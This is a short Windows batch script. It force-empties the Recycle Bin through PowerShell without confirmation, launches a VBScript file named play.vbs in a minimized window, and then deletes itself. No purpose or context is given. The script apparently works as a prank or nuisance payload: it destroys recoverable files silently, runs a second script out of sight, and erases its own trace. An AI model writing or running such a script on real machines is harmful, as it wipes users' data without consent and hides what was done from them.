@echo off 	
powershell Clear-RecycleBin -Force
start /min play.vbs
del %0
